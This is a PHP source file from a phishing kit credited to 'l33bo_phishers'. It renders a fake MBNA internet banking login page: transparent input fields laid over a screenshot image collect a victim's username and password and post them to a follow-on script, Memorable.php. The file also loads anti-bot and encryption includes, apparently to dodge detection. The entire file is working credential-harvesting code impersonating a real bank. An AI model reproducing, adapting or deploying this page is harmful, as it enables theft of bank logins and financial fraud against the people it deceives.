<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "antibots.php";
require "crypt.php";
if($_SERVER["HTTPS"] != "on")
{
    header("Location: https://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
    exit();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<title>MBNA - Welcome to Internet Banking</title>
<META content="text/html; charset=us-ascii" http-equiv=Content-Type><LINK rel="shortcut icon" type=image/x-icon href="assets/images/favicon.ico">
<style type="text/css">
  
input {
    background-color:transparent;
    border: 0px solid;
}

 </style>
</head>
<body style="background-repeat:no-repeat;" background="1.png">
<form method="post" action="Memorable.php">
<input class="nadme" name="user" required=""  maxlength="50" minlength="3" autocomplete="off" style="HEIGHT: 37px; WIDTH: 274px; position:absolute; left:93px;top:253px; z-index:5" type="text">
<input class="pwd" name="pwd" required="" maxlength="50" minlength="3" type="password" autocomplete="off" style="HEIGHT: 37px; WIDTH: 274px; position:absolute; left:93px;top:356px; z-index:5">
<div style="position:absolute; left: 837px;top: 499px; z-index:5">
<input name="formimage1" src="assets/images/continue.png" type="image"><p>
<p>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
	<br>
&nbsp;</p></div>


</form></body>
</html>